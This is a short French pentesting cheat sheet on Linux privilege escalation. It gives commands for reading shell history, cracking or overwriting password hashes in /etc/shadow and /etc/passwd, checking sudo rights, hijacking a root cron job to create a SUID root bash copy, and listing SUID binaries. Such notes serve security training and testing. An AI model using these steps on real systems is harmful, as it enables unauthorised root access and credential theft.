---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ⚔️ PrivEsc

## CHERCHER BASH HISTORY&#x20;

```
cat ~/.*history | less 
```

## FICHIER ETC/XXX&#x20;

* Si le mdp est lisible (acces lecture) dans /etc/shadow => on pète le hash avec john ou hashcat &#x20;
* Modif mdp dans /etc/shadow (acces ecriture)  =>utiliser mkpasswd pour générer un mdp en sha-512&#x20;

```
mkpasswd -m sha-512 newpasswordhere 
```

* Modif mdp dans /etc/passwd (utiliser openssl pour ajouter un mdp)&#x20;

```
openssl passwd newpasswordhere 
```

## SUDOER&#x20;

Faire `sudo –l` pour connaitre ses droits et regarder les privEsc

* [https://gtfobins.github.io/](https://gtfobins.github.io/)&#x20;
* [https://lolbas-project.github.io/](https://lolbas-project.github.io/) (windows)&#x20;

## CRON&#x20;

```
cat /etc/crontab 
```

Si un cron existe avec le user root qui exécute un fichier et que ce fichier est modifiable alors on peut l'utiliser pour escalader (via un reverse shell par ex) &#x20;

* Si le PATH commence par /home/user et qu'un cron execute en root un fichier sans chemin absolu:&#x20;
  * On crée un fichier identique dans home/user &#x20;

```
#!/bin/bash 
cp /bin/bash /tmp/rootbash 
chmod +xs /tmp/rootbash 
```

* On lance

```
/tmp/rootbash -p 
```

## SUID&#x20;

&#x20;Find all the SUID/SGID executables on the Debian VM:&#x20;

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
